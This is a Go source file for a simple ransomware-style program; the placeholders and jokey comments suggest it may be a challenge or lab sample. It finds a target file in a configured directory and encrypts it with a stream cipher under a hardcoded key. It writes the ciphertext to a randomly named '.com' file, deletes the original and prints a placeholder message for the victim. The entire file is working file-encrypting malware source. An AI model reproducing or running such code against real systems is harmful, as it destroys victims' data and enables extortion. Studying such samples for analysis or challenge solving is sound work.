package main

import (
	"fmt"
	"./crypto"
	"io/ioutil"
	"strings"
	"encoding/binary"
	"crypto/rand"
	"strconv"
	"os"
)


const (
	Key = "DeepDarkDestiny"
	// Hum.......
	// I think "DivineDenseDimensions" is so cool!!
	// Next stage, I will replace the Key value!!
)

func randomString() string {
    var n uint64
    binary.Read(rand.Reader, binary.LittleEndian, &n)
    return strconv.FormatUint(n, 36)
}

func searchTargetFile(dir string) string {
    var path string

    files, err := ioutil.ReadDir(dir)
    if err != nil {
        return path
    }


    for _, file := range files {
    	if !file.IsDir() {
    		fname := file.Name()
    		if len(fname) == 24 { 
    			if strings.Contains(fname, "Target filename"){ //Set target filename
    				path = fname
    			}
    		} 
    	}
    }
    return path
}


func writeGarbageData(filepath string) {

    output := make([]byte, 3)
    ddd := "ddd"
    for i, v := range ddd {
		output[i] = byte(v)
    }

    err := ioutil.WriteFile(filepath, output, 0666)

    if err != nil {
        fmt.Println(os.Stderr, err)
        os.Exit(1)
    }

}

func main() {

	target_dir := "Target Dir. Name" //Set target Directory
	filename := searchTargetFile(target_dir)
	
	if filename == "" {
            fmt.Println("Dummy message") //Set dummy message
            os.Exit(1)
        }

	plain_image, err := ioutil.ReadFile(target_dir + "/" + filename)
	if err != nil {
            fmt.Println(os.Stderr, err)
            os.Exit(1)
        }

        buf := make([]byte, len(plain_image))
        for i, v := range plain_image {
            buf[i] = byte(v)
	}
        
	key, _ := crypto.NewCipher([]byte(Key))
	key.XORKeyStream(buf, buf)
	key.Reset()

        output := make([]byte, len(buf))
        for i, v := range buf {
	     output[i] = byte(v)
	}

	random_filename := randomString()
	filepath := target_dir + "/" + random_filename +".com"

	writeGarbageData(filepath)

	fp, err2 := os.OpenFile(filepath, os.O_WRONLY | os.O_APPEND, 0644)

	if err2 != nil {
            fmt.Println(os.Stderr, err)
            os.Exit(1)
        }

	_, err3 := fp.Write(output)

	if err3 != nil {
            fmt.Println(os.Stderr, err)
            os.Exit(1)
        }

        err4 := os.Remove(target_dir + "/" +filename)

	if err4 != nil {
            fmt.Println(os.Stderr, err)
            os.Exit(1)
        }


        fmt.Println("Message for Victim") //Set message for victim
}
